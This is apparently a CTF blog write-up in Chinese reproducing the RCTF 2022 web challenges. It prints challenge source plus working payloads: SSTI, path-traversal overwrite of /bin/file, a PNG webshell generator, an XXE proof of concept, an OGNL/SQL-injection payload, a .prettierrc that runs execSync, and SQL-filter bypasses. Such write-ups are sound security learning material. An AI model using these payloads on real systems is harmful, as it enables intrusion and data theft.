---
title: "RCTF 2022 Web 赛后复现"
date: 2022-12-13T22:44:03+08:00
lastmod: 2022-12-13T22:44:03+08:00
draft: false
author: "X1r0z"

tags: ['ctf']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

最近疫情严重, rctf 看了两题就收拾行李回家去了...

赛后趁着环境没关赶紧复现一下

<!--more-->

## filechecker_mini

app.py

```python
from flask import Flask, request, render_template, render_template_string
# from waitress import serve
import os
import subprocess

app_dir = os.path.split(os.path.realpath(__file__))[0]
app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = f'{app_dir}/upload/'

@app.route('/', methods=['GET','POST'])
def index():
    try:
        if request.method == 'GET':
            return render_template('index.html',result="ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿")

        elif request.method == 'POST':
            f = request.files['file-upload']
            filepath = os.path.join(app.config['UPLOAD_FOLDER'], f.filename)

            if os.path.exists(filepath) and ".." in filepath:
                return render_template('index.html', result="Don't (^=◕ᴥ◕=^) (^=◕ᴥ◕=^) (^=◕ᴥ◕=^)")
            else:
                f.save(filepath)
                file_check_res = subprocess.check_output(
                    ["/bin/file", "-b", filepath], 
                    shell=False, 
                    encoding='utf-8',
                    timeout=1
                )
                os.remove(filepath)
                if "empty" in file_check_res or "cannot open" in file_check_res:
                    file_check_res="wafxixi ฅ•ω•ฅ ฅ•ω•ฅ ฅ•ω•ฅ"
                return render_template_string(file_check_res)

    except:
        return render_template('index.html', result='Error ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ')

if __name__ == '__main__':
    app.run( host="0.0.0.0", port=3000)
    #serve(app, host="0.0.0.0", port=3000, threads=1000, cleanup_interval=30)
```

思路是利用 file 命令的回显来 ssti

去翻了下 file 的源码, 随便找了个可利用的 mine header

![image-20221213105459981](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212131055104.png)

上面用的是 vim swap file, 看 wp 的时候看到别的师傅用了 `#!/ssti_code`

## filechecker_plus

app.py

```python
from flask import Flask, request, render_template, render_template_string
from waitress import serve
import os
import subprocess

app_dir = os.path.split(os.path.realpath(__file__))[0]
app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = f'{app_dir}/upload/'

@app.route('/', methods=['GET','POST'])
def index():
    try:
        if request.method == 'GET':
            return render_template('index.html',result="ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿")

        elif request.method == 'POST':
            f = request.files['file-upload']
            filepath = os.path.join(app.config['UPLOAD_FOLDER'], f.filename)

            if os.path.exists(filepath) and ".." in filepath:
                return render_template('index.html', result="Don't (^=◕ᴥ◕=^) (^=◕ᴥ◕=^) (^=◕ᴥ◕=^)")
            else:
                f.save(filepath)
                file_check_res = subprocess.check_output(
                    ["/bin/file", "-b", filepath], 
                    shell=False, 
                    encoding='utf-8',
                    timeout=1
                )
                os.remove(filepath)
                if "empty" in file_check_res or "cannot open" in file_check_res:
                    file_check_res="wafxixi ฅ•ω•ฅ ฅ•ω•ฅ ฅ•ω•ฅ"
                return render_template('index.html', result=file_check_res)

    except:
        return render_template('index.html', result='Error ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ')

if __name__ == '__main__':
    serve(app, host="0.0.0.0", port=3000, threads=1000, cleanup_interval=30)
```

修复了 ssti, 然后去网上搜了一下发现 `os.path.join()` 可被绕过

[https://lazzzaro.github.io/2020/11/14/web-python%E7%BB%95%E8%BF%87/index.html](https://lazzzaro.github.io/2020/11/14/web-python%E7%BB%95%E8%BF%87/index.html)

如果有参数以 `/` 开头, 则从该参数开始向后拼接路径

```python
os.path.join('uploads/', '/flag') # /flag
os.path.join('uploads/','/etc/passwd', '/flag') # /flag
```

之后利用路径穿越来覆盖任意文件, 这里覆盖 /bin/file 为以下内容, 通过 `subprocess.check_output()` 来得到回显

```bash
#!/bin/bash
cat /flag
```

![image-20221213140350732](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212131403807.png)

注意在 burp 里面发送时需要把每行末尾的 `\r` 删掉

## filechecker_pro_max

app.py

```python
from flask import Flask, request, render_template
from waitress import serve
import os
import subprocess

app_dir = os.path.split(os.path.realpath(__file__))[0]
app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = f'{app_dir}/upload/'

@app.route('/', methods=['GET','POST'])
def index():
    try:
        if request.method == 'GET':
            return render_template('index.html',result="ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿")

        elif request.method == 'POST':
            f = request.files['file-upload']
            filepath = os.path.join(app.config['UPLOAD_FOLDER'], f.filename)

            if os.path.exists(filepath):
                return render_template('index.html', result=f"{filepath} already exists (^=◕ᴥ◕=^) (^=◕ᴥ◕=^) (^=◕ᴥ◕=^)")
            else:
                f.save(filepath)
                file_check_res = subprocess.check_output(
                    ["/bin/file", "-b", filepath], 
                    shell=False, 
                    encoding='utf-8',
                    timeout=1
                )
                os.remove(filepath)
                if "empty" in file_check_res or "cannot open" in file_check_res:
                    file_check_res="wafxixi ฅ•ω•ฅ ฅ•ω•ฅ ฅ•ω•ฅ"
                return render_template('index.html', result=file_check_res)

    except:
        return render_template('index.html', result='Error ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ')

if __name__ == '__main__':
    serve(app, host="0.0.0.0", port=3000, threads=1000, cleanup_interval=30)
```

本地来回试了好几次, 懒得写了...

思路是利用 `/etc/ld.so.preload` 来劫持系统函数 (需要条件竞争)

[https://payloads.online/archivers/2020-01-01/1/](https://payloads.online/archivers/2020-01-01/1/)

[https://www.anquanke.com/post/id/254388](https://www.anquanke.com/post/id/254388)

## easy_upload

symfony 框架, 核心就一个 UploadController

```php
<?php
namespace App\Controller;
use Symfony\Component\Filesystem\Path;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Annotation\Route;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;

class UploadController extends AbstractController
{
    public function __construct()
    {
        mb_detect_order(["BASE64","ASCII","UTF-8"]);
        $this->ext_blacklist = [
            "php",
            "ini",
            "phtml",
            "htaccess",
        ];
        $this->content_blacklist = ["<?", "php", "handler"];
    }
    public function invalid($msg){
        return new Response("error occurs: $msg");
    }
    #[Route('/', name: 'upload')]
    public function index(Request $request)
    {
        $uploadHtml = <<<EOF
<html>
<form action="/" enctype="multipart/form-data" method="post">
  <input type="file" id="file" name="file">
  <input type="submit">
</form>
</html>
EOF;

        $file = @$_FILES["file"];
        if($file == null){
            return new Response(
                //'<p>Before start you should know that it\'s not a good challenge.You can\'t get anything from this challenge.If you hate this challenge, just skip plz. </p><p>这道题并不是一道好题，你不会从这道题上获得任何东西。如果你讨厌这道题就直接跳过吧。</p>'
                $uploadHtml
            );
        }else {

            $content = file_get_contents($file["tmp_name"]);
            $charset = mb_detect_encoding($content, null, true);
            if(false !== $charset){
                if($charset == "BASE64"){
                    $content = base64_decode($content);
                }
                foreach ($this->content_blacklist as $v) {
                    if(stristr($content, $v)!==false){
                        return $this->invalid("fucking $v .");
                    }
                }
            }else{
                return $this->invalid("fucking invalid format.");
            }
            $ext = Path::getExtension($file["name"], true);
            if(strstr($file["name"], "..")!==false){
                return $this->$this->invalid("fucking path travel");
            }
            foreach ($this->ext_blacklist as $v){
                if (strstr($ext, $v) !== false){
                    return $this->invalid("fucking $ext extension.");
                }
            }
            $dir = dirname($request->server->get('SCRIPT_FILENAME'));

            $result = move_uploaded_file($file["tmp_name"], "$dir/upload/".strtolower($file["name"]));
            if($result){
                return new Response("upload success");
            }else {
                return new Response("upload failed");
            }
        }
    }
}
```

首先因为后缀最后传入了 strtolower, 在前面可以用大小写绕过检测

其次程序会有个 charset 的判断, 如果 `mb_detect_encoding` 的结果不为空, 就会对文件内容进行判断

查阅 PHP 手册得知 `mb_detect_encoding` 遇到无法辨别的 charset 会返回 false

于是思路就是通过打乱上传文件内容的编码来 getshell

我这边用的是 png 绕过二次渲染的图片马

```php
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);



$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img,'./1.png');
?>
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212131105857.png)

![image-20221213110650081](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212131106205.png)

## ezbypass

DemoController

![image-20221213180730847](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212131807941.png)

MyFilter

![image-20221213180751127](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212131807318.png)

UserProvider

![image-20221213180854574](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212131808670.png)

UserMapper

![image-20221213180911864](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212131809952.png)

考点是 java xxe, 过滤了 `!DOCTYPE` 关键词, 并且有 filter 验证 uri 是否以 `.ico` 结尾

uri 绕过的参考文章如下

[http://cn-sec.com/archives/246159.html](http://cn-sec.com/archives/246159.html)

```
http://94.74.86.95:8899/index;.ico
```

关键词的绕过其实也很简单, 将 xml 转成 utf-16be utf-16le 都行

不过当时做这题的时候自己在这步掉坑里了, 用了 StringReader 来包装 poc, 而不是 ByteArrayInputStream 这种原始的 stream, 导致 xml 解析一直失败...

```java
package com.example;

import org.w3c.dom.Document;
import org.w3c.dom.NodeList;
import org.xml.sax.InputSource;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import java.lang.reflect.Constructor;
import java.util.Base64;

public class xxe {
    public static void main(String[] args) throws Exception{
        String poc = "<?xml version=\"1.0\"?>\n" +
                "<!DOCTYPE test [\n" +
                "<!ENTITY file SYSTEM \"file:///flag\">]>\n" +
                "<test>\n" +
                "&file;\n" +
                "</test>";
        byte[] bytepoc = poc.getBytes("UTF-16BE");
        String b64poc = Base64.getEncoder().encodeToString(bytepoc);
//        xxe(b64poc, "string", new String[]{"java.io.StringReader", "java.lang.String", "org.xml.sax.InputSource", "java.io.Reader"});
        xxe(b64poc, "aaa", new String[]{"java.io.ByteArrayInputStream", "[B", "org.xml.sax.InputSource", "java.io.InputStream"});
    }

    public static String xxe(String b64poc, String type, String[] classes) throws Exception {
        String res = "";
        byte[] bytepoc = Base64.getDecoder().decode(b64poc);
        if (check(bytepoc)) {
            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
            DocumentBuilder builder = dbf.newDocumentBuilder();
            InputSource inputSource = null;
            Object wrappoc = null;
            Constructor<?> constructor = Class.forName(classes[0]).getDeclaredConstructor(new Class[] { Class.forName(classes[1]) });
            if (type.equals("string")) {
                String stringpoc = new String(bytepoc);
                wrappoc = constructor.newInstance(new Object[] { stringpoc });
            } else {
                wrappoc = constructor.newInstance(new Object[] { bytepoc });
            }
            inputSource = (InputSource) Class.forName(classes[2]).getDeclaredConstructor(new Class[] { Class.forName(classes[3]) }).newInstance(new Object[] { wrappoc });
            Document doc = builder.parse(inputSource);
            NodeList nodes = doc.getChildNodes();
            for (int i = 0; i < nodes.getLength(); i++) {
                if (nodes.item(i).getNodeType() == 1) {
                    res = res + nodes.item(i).getTextContent();
                    System.out.println(nodes.item(i).getTextContent());
                }
            }
        }
        return res;
    }

    public static boolean check(byte[] poc) throws Exception {
        String str = new String(poc);
        String[] blacklist = { "!DOCTYPE", new String(new byte[] { -2, -1 }), new String(new byte[] { -1, -2 }) };
        for (String black : blacklist) {
            if (str.indexOf(black) != -1) {
                System.out.println("not allow");
                return false;
            }
        }
        return true;
    }
}
```

之后通过万能密码来 sql 注入, 利用 OGNL 表达式绕过单引号过滤的限制

这个步骤是看了 wp 才知道的, 具体原因目前也说不太清楚, 参考文章如下

[https://xz.aliyun.com/t/10482](https://xz.aliyun.com/t/10482)

[https://chenlvtang.top/2022/08/11/Java%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E4%B9%8BOGNL/](https://chenlvtang.top/2022/08/11/Java%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E4%B9%8BOGNL/)

自己反编译源码调试了一下, 简要来说就是跟进到某一个步骤的时候, mybatis 会调用 OGNL parser 来解析 sql 语句中以 `${}` 或者 `#{}` 中的表达式并将执行结果替换进去

然后注意最终拼接的 sql 语句 where 之后的部分是以小括号包裹的, 注入时需要手动闭合

![image-20221213175456174](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212131755398.png)

最终 payload

```
password=${@java.lang.Character@toString(39)}) or 1=1#&poc=ADwAPwB4AG0AbAAgAHYAZQByAHMAaQBvAG4APQAiADEALgAwACIAPwA%2bAAoAPAAhAEQATwBDAFQAWQBQAEUAIAB0AGUAcwB0ACAAWwAKADwAIQBFAE4AVABJAFQAWQAgAGYAaQBsAGUAIABTAFkAUwBUAEUATQAgACIAZgBpAGwAZQA6AC8ALwAvAGYAbABhAGcAIgA%2bAF0APgAKADwAdABlAHMAdAA%2bAAoAJgBmAGkAbABlADsACgA8AC8AdABlAHMAdAA%2b&type=aaa&yourclasses=java.io.ByteArrayInputStream,[B,org.xml.sax.InputSource,java.io.InputStream
```

![image-20221213200206713](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212132002798.png)

## PrettierOnline

附件中存在两个服务 fe 和 prettier

前者负责启动 prettier docker 容器并将 `.prettierrc` 传入, 后者将 `.prettierrc` 作为配置文件解析, 然后格式化自身即 index.js (所以说题目给的描述是 `Prettier my(not your) code`)

prettier index.js

```javascript
const fs = require('fs')
const crypto = require('crypto')
const prettier = require('prettier')
const { nextTick, exit } = require('process')
require('./fw')

//const id = fs.readFileSync('./dist/id', 'utf-8').toString('utf-8').trim()
// fs.unlinkSync('./dist/id')
prettier.resolveConfig(`${__dirname}/.prettierrc`).then(config => {
  const ret = prettier.format(fs.readFileSync(__filename, 'utf-8'), config)
  //const o = crypto.createHash('sha256').update(Buffer.from(id, 'utf-8')).digest().toString('hex')
  //fs.writeFileSync(`./dist/${id}`, o, 'utf-8')
  fs.writeFileSync('./dist/ret.js', ret, 'utf-8')
  nextTick(() => {
    throw new Error('No NextTick here!')
  })
  exit(0)
})

```

prettie fw.js

```javascript
const Module = require('module')
const oldRequire = Module.prototype.require
Module.prototype.require = function (id) {
  if (typeof id !== 'string') {
    throw new Error('Bye')
  }
  const isCore = Module.isBuiltin(id)
  if (isCore) {
    if (!/fs|path|util|os/.test(id)) {
      throw new Error('Bye, ' + id)
    }
  } else {
    id = Module._resolveFilename(id, this)
  }
  return oldRequire.call(oldRequire, id)
}
process.dlopen = () => {}
```

fw.js 利用 prototype hook require 函数并进行白名单限制

查了下 prettier 官方文档

[https://prettier.io/docs/en/options.html#parser](https://prettier.io/docs/en/options.html#parser)

[https://prettier.io/docs/en/configuration.html](https://prettier.io/docs/en/configuration.html)

我们可以通过 parser 参数来指定格式化代码的 parser, 如果指定 parser 为 `.prettierrc` 本身, 然后结合 `module.exports` 就可以造成命令执行 (这里我也不知道该怎么解释, 不会 nodejs 呜呜)

```yaml
parser: ".prettierrc"
xxxzzz: module.exports = () => {return global.process.mainModule.constructor._load('child_process').execSync('/readflag').toString();}
```

`.prettierrc` 得改成 yaml 格式, 因为这样子可以兼容 js 的语法(前面的 `parser:` `xxxzzz:` 相当于 label, 不会造成语法错误)

![image-20221213213922978](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212132139107.png)

## ezruoyi

赛后看 wp 复现的, 应该是个 0day (?)

注入点位置

![image-20221213223124280](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212132231358.png)

filterKeyword 方法

![image-20221213223150543](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212132231620.png)

一眼 `select/**/` 绕过

然后这里好像必须得执行 create table 操作, 于是利用 `create table xxx as select` 来执行 select 查询 + updatexml 报错注入

![image-20221213223029316](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212132230479.png)
